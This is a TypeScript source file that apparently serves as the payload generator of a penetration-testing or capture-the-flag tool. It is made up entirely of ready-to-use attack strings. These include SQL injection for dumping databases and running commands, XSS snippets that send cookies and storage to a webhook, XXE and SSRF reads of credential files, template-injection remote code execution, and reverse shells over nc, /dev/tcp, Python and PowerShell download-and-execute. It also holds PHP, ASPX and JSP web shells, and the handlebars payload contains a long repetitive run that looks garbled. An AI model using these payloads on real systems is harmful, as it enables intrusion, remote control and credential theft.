export const Payload = {
    SQLi: {
        Generic: {
            authBypass1: () => "' OR 1=1--",
            authBypass2: () => "' OR '1'='1",
            authBypass3: () => '" OR "1"="1',
            authBypass4: () => "' OR TRUE--",
            timeBased: () => "'; WAITFOR DELAY '0:0:5'--",
            unionTest: () => "' UNION SELECT 1,2,3--",
        },
        spaceToComment: (value: string) => value.replace(/[^\S\r\n]+/g, '/**/'),

        polyglot: () => "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",

        MySQL: {
            unionSelect: ({ columns }: any) => {
                const c = parseInt(columns)
                if (isNaN(c)) {
                    return ''
                }

                return (
                    'union select ' +
                    Array.from(Array(c + 1).keys())
                        .slice(1)
                        .join(',')
                )
            },

            dumpDatabases: ({ columns, position }: any) => {
                const c = parseInt(columns)
                const p = parseInt(position)
                if (isNaN(c) || isNaN(p) || p > c) {
                    return ''
                }

                const fields = Array.from(Array(c + 1).keys()).slice(1)
                const fieldsAny: any[] = fields
                fieldsAny[p - 1] = 'group_concat(schema_name)'

                return (
                    'union select ' + fieldsAny.join(',') + ' from information_schema.schemata'
                )
            },

            dumpTables: ({ columns, position }: any) => {
                const c = parseInt(columns)
                const p = parseInt(position)
                if (isNaN(c) || isNaN(p) || p > c) {
                    return ''
                }

                const fields: any[] = Array.from(Array(c + 1).keys()).slice(1)
                fields[p - 1] = 'group_concat(table_name)'

                return (
                    'union select ' +
                    fields.join(',') +
                    ' from information_schema.tables where table_schema=database()'
                )
            },

            dumpColumns: ({ columns, position }: any) => {
                const c = parseInt(columns)
                const p = parseInt(position)
                if (isNaN(c) || isNaN(p) || p > c) {
                    return ''
                }

                const fields: any[] = Array.from(Array(c + 1).keys()).slice(1)
                fields[p - 1] = 'group_concat(column_name)'

                return (
                    'union select ' +
                    fields.join(',') +
                    ' from information_schema.columns where table_schema=database()'
                )
            },

            // PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/
            dumpInOneShot: () =>
                "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)",

            dumpCurrentQueries: () =>
                '(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a)',

            errorBased: () => {
                return 'extractvalue(0x0a,concat(0x0a,(select database())))'
            },
        },

        PostgreSQL: {
            unionSelect: ({ columns }: any) => {
                const c = parseInt(columns)
                if (isNaN(c)) {
                    return ''
                }

                return 'union select ' + Array(c).fill('null').join(',')
            },

            dumpDatabases: ({ columns, position }: any) => {
                const c = parseInt(columns)
                const p = parseInt(position)
                if (isNaN(c) || isNaN(p) || p > c) {
                    return ''
                }

                const fields = Array(c).fill('null')
                fields[p - 1] = "string_agg(datname, ',')"

                return 'union select ' + fields.join(',') + ' from pg_database'
            },

            dumpTables: ({ columns, position }: any) => {
                const c = parseInt(columns)
                const p = parseInt(position)
                if (isNaN(c) || isNaN(p) || p > c) {
                    return ''
                }

                const fields = Array(c).fill('null')
                fields[p - 1] = "string_agg(tablename, ',')"

                return (
                    ' union select ' +
                    fields.join(',') +
                    " from pg_tables where schemaname='public'"
                )
            },

            dumpColumns: ({ columns, position }: any) => {
                const c = parseInt(columns)
                const p = parseInt(position)
                if (isNaN(c) || isNaN(p) || p > c) {
                    return ''
                }

                const fields = Array(c).fill('null')
                fields[p - 1] = "string_agg(column_name, ',')"

                return (
                    'union select ' +
                    fields.join(',') +
                    " from information_schema.columns where table_schema='public'"
                )
            },

            errorBased: () => {
                return 'cast(version() as int)'
            },

            cmdExec: () => {
                return [
                    'DROP TABLE IF EXISTS cmd_exec;',
                    'CREATE TABLE cmd_exec(cmd_output text);',
                    "COPY cmd_exec FROM PROGRAM 'id';",
                    'SELECT * FROM cmd_exec;',
                ].join(' ')
            },
        },
        SQLite: {
            unionSelect: ({ columns }: any) => {
                const c = parseInt(columns)
                if (isNaN(c)) {
                    return ''
                }

                return (
                    'union select ' +
                    Array.from(Array(c + 1).keys())
                        .slice(1)
                        .join(',')
                )
            },

            dumpTables: ({ columns, position }: any) => {
                const c = parseInt(columns)
                const p = parseInt(position)
                if (isNaN(c) || isNaN(p) || p > c) {
                    return ''
                }

                const fields: any[] = Array.from(Array(c + 1).keys()).slice(1)
                fields[p - 1] = 'group_concat(name)'

                return (
                    'union select ' +
                    fields.join(',') +
                    " from sqlite_master WHERE type='table'"
                )
            },

            dumpColumns: ({ columns, position }: any) => {
                const c = parseInt(columns)
                const p = parseInt(position)
                if (isNaN(c) || isNaN(p) || p > c) {
                    return ''
                }

                const fields: any[] = Array.from(Array(c + 1).keys()).slice(1)
                fields[p - 1] = 'group_concat(sql)'

                return (
                    'union select ' +
                    fields.join(',') +
                    " from sqlite_master WHERE type='table'"
                )
            },
        },
        MSSQL: {
            unionSelect: ({ columns }: any) => {
                const c = parseInt(columns)
                if (isNaN(c)) {
                    return ''
                }

                return 'union select ' + Array(c).fill('null').join(',')
            },

            dumpDatabases: ({ columns, position }: any) => {
                const c = parseInt(columns)
                const p = parseInt(position)
                if (isNaN(c) || isNaN(p) || p > c) {
                    return ''
                }

                const fields = Array(c).fill('null')
                fields[p - 1] = "string_agg(name, ',')"

                return 'union select ' + fields.join(',') + ' from sysdatabases'
            },

            dumpTables: ({ columns, position }: any) => {
                const c = parseInt(columns)
                const p = parseInt(position)
                if (isNaN(c) || isNaN(p) || p > c) {
                    return ''
                }

                const fields = Array(c).fill('null')
                fields[p - 1] = "string_agg(name, ',')"

                return (
                    'union select ' +
                    fields.join(',') +
                    " from DB_NAME..sysobjects where xtype='u'"
                )
            },

            dumpColumns: ({ columns, position }: any) => {
                const c = parseInt(columns)
                const p = parseInt(position)
                if (isNaN(c) || isNaN(p)) return ''

                const fields = Array(c).fill('null')
                fields[p - 1] = "string_agg(name, ',')"

                return (
                    'union select ' +
                    fields.join(',') +
                    " from DB_NAME..syscolumns where id in (select id from DB_NAME..sysobjects where xtype='u' and name='TABLE_NAME')"
                )
            },

            errorBased: () => {
                return 'user_name(@@version)'
            },

            cmdExec: () => {
                return [
                    'exec sp_configure "show advanced options", 1;',
                    'reconfigure;',
                    'exec sp_configure "xp_cmdshell", 1;',
                    'reconfigure;',
                    'exec xp_cmdshell "whoami";',
                ].join(' ')
            },
        },
    },

    XSS: {
        Basic: {
            scriptAlert: () => "<script>alert(1)</script>",
            imgOnError: () => "<img src=x onerror=alert(1)>",
            svgOnLoad: () => "<svg onload=alert(1)>",
            bodyOnLoad: () => "<body onload=alert(1)>",
            iframeOnLoad: () => "<iframe onload=alert(1)>",
        },
        polyglot: () =>
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',

        Vue: {
            vue2Interpolation: () => '{{_c.constructor`alert()`()}}',
            vue2Directive: () => '<x/v-=_c.constructor`alert()`()>',
            vue3Interpolation: () => '{{$emit.constructor`alert()`()}}',
            vue3DynamicComponent: () => '<component is=script text=alert()>',
        },

        AngularJS: {
            angularJS1_6WithPrototype$on: () =>
                '<div ng-app ng-csp>{{$on.curry.call().alert()}}</div>',
            // Author: Gareth Heyes (PortSwigger)
            angularJSWith$event: () =>
                '<div ng-app ng-csp><input autofocus ng-focus="$event.path|orderBy:\'[].constructor.from([1], alert)\'"></div>',
        },

        snippets: {
            getSamesiteFlag: () =>
                'fetch(`/flag`).then(t=>t.text()).then(t=>location=`https://webhook/?f=`+encodeURIComponent(t))',
            getCookieFlag: () =>
                'location=`https://webhook/?f=`+encodeURIComponent(document.cookie)',
            getStorageFlag: () =>
                'location=`https://webhook/?f=`+encodeURIComponent(localStorage.flag)',
        },
    },

    JWT: {
        decode: (token: string) => {
            try {
                const parts = token.split('.')
                if (parts.length !== 3) return 'Invalid JWT'
                const header = atob(parts[0])
                const payload = atob(parts[1])
                return JSON.stringify(JSON.parse(header), null, 2) + '\n.\n' + JSON.stringify(JSON.parse(payload), null, 2)
            } catch (e) {
                return 'Error decoding JWT: ' + (e as Error).message
            }
        },
    },

    LFI: {
        phpWrapperBase64: (value: string) =>
            'php://filter/convert.base64-encode/resource=' + value,
    },

    SSRF: {
        awsRoleName: () =>
            'http://169.254.169.254/latest/meta-data/iam/security-credentials',
    },

    CMDi: {
        Probes: {
            unixBasic: () => '; id',
            unixPipe: () => '| id',
            unixBacktick: () => '`id`',
            unixBackground: () => '& id',
            windowsBasic: () => '& whoami',
            windowsPipe: () => '| whoami',
        },
        Blind: {
            sleep: () => '; sleep 10',
            ping: () => '; ping -c 10 127.0.0.1',
        },
        Bypasses: {
            spaceIFS: () => '${IFS}',
            slash: () => '${HOME:0:1}',
            cat: () => '/bin/c?? /etc/passwd',
        },
        OOB: {
            curl: ({ url }: any) => `curl ${url}`,
            wget: ({ url }: any) => `wget ${url}`,
        },
    },

    XXE: {
        Basic: {
            passwd: () => '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            winIni: () => '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        },
        Blind: {
            oob: ({ url }: any) => `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "${url}"><!ENTITY % dtd SYSTEM "${url}/evil.dtd">]><root>&xxe;</root>`,
        },
        SOAP: {
            xxe: () => '<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><doc>&xxe;</doc>]]></foo></soap:Body>',
        },
    },

    NoSQL: {
        AuthBypass: {
            neNull: () => '{"$ne": null}',
            gtEmpty: () => '{"$gt": ""}',
            true: () => '{"$where": "return true"}',
        },
        Extraction: {
            regex: ({ field }: any) => `{"${field}": {"$regex": "^a"}}`,
        },
    },

    OpenRedirect: {
        Basic: {
            slashes: () => '//google.com',
            backslash: () => '/\\google.com',
            urlEncoded: () => '%09/google.com',
            nullByte: () => '/%00/google.com',
        },
    },

    SSTI: {
        Jinja2: {
            tuple2AllSubclasses: () => '{{().__class__.__base__.__subclasses__()}}',
            tuple2RCE: () =>
                "{%for(x)in().__class__.__base__.__subclasses__()%}{%if'war'in(x).__name__ %}{{x()._module.__builtins__['__import__']('os').popen('ls').read()}}{%endif%}{%endfor%}",
            g2RCE: () =>
                "{{g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
            urlFor2RCE: () =>
                "{{url_for.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
            application2RCE: () =>
                "{{application.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
            // config2RCE Reference: https://twitter.com/realgam3/status/1184747565415358469
            config2RCE: () =>
                "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
            getFlashedMessages2RCE: () =>
                "{{get_flashed_messages.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
            self2RCE: () =>
                "{{self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
            lipsum2RCE: () =>
                "{{lipsum.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
            cycler2RCE: () =>
                "{{cycler.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
            joiner2RCE: () =>
                "{{joiner.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
            namespace2RCE: () =>
                "{{namespace.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
            addUrlRule: () =>
                "{{url_for.__globals__.current_app.add_url_rule('/1333337',view_func=url_for.__globals__.__builtins__['__import__']('os').popen('ls').read)}}",
        },
        Java: {
            thymeleafRCE: ({ host, port }: any) =>
                `__\${T(java.lang.Runtime).getRuntime().exec("nc ${host} ${port} -e sh")}__::.x`,
            commonRCE: () => "${T(java.lang.Runtime).getRuntime().exec('ls')}",
        },
        Ruby: {
            erbBasic: () => '<%= 7 * 7 %>',
            erbRCE: () => '<%= `id` %>',
        },
        Node: {
            pugBasic: () => '#{7*7}',
            pugRCE: () => '#{global.process.mainModule.require("child_process").execSync("id")}',
            handlebarsRCE: () => '{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}} {{this.pop}} {{#with (string.sub.apply 236 (conslist.concat [34])) as |codelist|}} {{#with (string.sub.apply 236 (codelist.concat [34])) as |bs|}} {{#with (string.sub.apply 236 (codelist.concat [60])) as |newline|}} {{#with (string.sub.apply 236 (codelist.concat [36])) as |dollar|}} {{#with (string.sub.apply 236 (codelist.concat [97])) as |a|}} {{#with (string.sub.apply 236 (codelist.concat [104])) as |h|}} {{#with (string.sub.apply 236 (codelist.concat [114])) as |r|}} {{#with (string.sub.apply 236 (codelist.concat [101])) as |e|}} {{#with (string.sub.apply 236 (codelist.concat [102])) as |f|}} {{#with (string.sub.apply 236 (codelist.concat [111])) as |o|}} {{#with (string.sub.apply 236 (codelist.concat [115])) as |s|}} {{#with (string.sub.apply 236 (codelist.concat [113])) as |q|}} {{#with (string.sub.apply 236 (codelist.concat [117])) as |u|}} {{#with (string.sub.apply 236 (codelist.concat [105])) as |i|}} {{#with (string.sub.apply 236 (codelist.concat [116])) as |t|}} {{#with (string.sub.apply 236 (codelist.concat [112])) as |p|}} {{#with (string.sub.apply 236 (codelist.concat [108])) as |l|}} {{#with (string.sub.apply 236 (codelist.concat [121])) as |y|}} {{#with (string.sub.apply 236 (codelist.concat [109])) as |m|}} {{#with (string.sub.apply 236 (codelist.concat [99])) as |c|}} {{#with (string.sub.apply 236 (codelist.concat [107])) as |k|}} {{#with (string.sub.apply 236 (codelist.concat [110])) as |n|}} {{#with (string.sub.apply 236 (codelist.concat [100])) as |d|}} {{#with (string.sub.apply 236 (codelist.concat [61])) as |eq|}} {{#with (string.sub.apply 236 (codelist.concat [46])) as |dot|}} {{#with (string.sub.apply 236 (codelist.concat [40])) as |op|}} {{#with (string.sub.apply 236 (codelist.concat [41])) as |cp|}} {{#with (string.sub.apply 236 (codelist.concat [32])) as |sp|}} {{#with (string.sub.apply 236 (codelist.concat [45])) as |dash|}} {{#with (string.sub.apply 236 (codelist.concat [95])) as |us|}} {{#with (string.sub.apply 236 (codelist.concat [47])) as |sl|}} {{#with (string.sub.apply 236 (codelist.concat [38])) as |and|}} {{#with (string.sub.apply 236 (codelist.concat [59])) as |semi|}} {{#with (string.sub.apply 236 (codelist.concat [58])) as |colon|}} {{#with (string.sub.apply 236 (codelist.concat [123])) as |ob|}} {{#with (string.sub.apply 236 (codelist.concat [125])) as |cb|}} {{#with (string.sub.apply 236 (codelist.concat [91])) as |os|}} {{#with (string.sub.apply 236 (codelist.concat [93])) as |cs|}} {{#with (string.sub.apply 236 (codelist.concat [94])) as |car|}} {{#with (string.sub.apply 236 (codelist.concat [124])) as |bar|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |til|}} {{#with (string.sub.apply 236 (codelist.concat [33])) as |exc|}} {{#with (string.sub.apply 236 (codelist.concat [63])) as |qest|}} {{#with (string.sub.apply 236 (codelist.concat [64])) as |at|}} {{#with (string.sub.apply 236 (codelist.concat [35])) as |hash|}} {{#with (string.sub.apply 236 (codelist.concat [37])) as |perc|}} {{#with (string.sub.apply 236 (codelist.concat [42])) as |star|}} {{#with (string.sub.apply 236 (codelist.concat [43])) as |plus|}} {{#with (string.sub.apply 236 (codelist.concat [44])) as |comma|}} {{#with (string.sub.apply 236 (codelist.concat [62])) as |gt|}} {{#with (string.sub.apply 236 (codelist.concat [60])) as |lt|}} {{#with (string.sub.apply 236 (codelist.concat [96])) as |bt|}} {{#with (string.sub.apply 236 (codelist.concat [39])) as |sq|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}} {{#with (string.sub.apply 236 (codelist.concat [126])) as |tild|}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}',
        },
    },

    Shell: {
        Python: {
            py3: ({ host, port }: any) =>
                `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${host}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
            py: ({ host, port }: any) =>
                `python -c 'import os,pty,socket;s=socket.socket();s.connect(("${host}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
        },
        sh: {
            withI: ({ host, port }: any) => `sh -i >& /dev/tcp/${host}/${port} 0>&1`,
            withoutI: ({ host, port }: any) =>
                `0<&196;exec 196<>/dev/tcp/${host}/${port};sh <&196 >&196 2>&196`,
        },
        nc: {
            withE: ({ host, port }: any) => `nc -e /bin/sh ${host} ${port}`,
            withC: ({ host, port }: any) => `nc -c bash ${host} ${port}`,
        },
        Powershell: {
            downloadString: ({ host, port }: any) => `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.WebClient.DownloadString('http://${host}:${port}/shell.ps1') | IEX`,
            tcpClient: ({ host, port }: any) => `$client = New-Object System.Net.Sockets.TcpClient('${host}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
        },
        php: {
            reverseShell: ({ host, port }: any) =>
                `php -r '$sock=fsockopen("${host}",${port});exec("sh <&3 >&3 2>&3");'`,
            webshellEval: () => '<?=eval($_GET[_]);',
            webshellExec: () => '<?=exec($_GET[_]);',
            webshellSystem: () => '<?=system($_GET[_]);',
            webshellBackquote: () => '<?=`$_GET[_]`;',
            webshellAllFunction: () => '<?=($_GET[ÿ])($_GET[_]);',
            webshellNoAlphabetsDigits: () =>
                '<?=(~%8C%86%8C%8B%9A%92)(${_.(~%B8%BA%AB)}[_]);',
        },
        Web: {
            ASPX: () => '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><script runat="server">protected void Page_Load(object sender, EventArgs e){string c=Request.QueryString["c"];if(c!=null){ProcessStartInfo i=new ProcessStartInfo("cmd.exe","/c "+c);i.RedirectStandardOutput=true;i.UseShellExecute=false;Process p=Process.Start(i);Response.Write(p.StandardOutput.ReadToEnd());p.WaitForExit();}}</script>',
            JSP: () => '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>',
        },
    },

    Custom: {
        insert: (value: any) => value,
    },
}
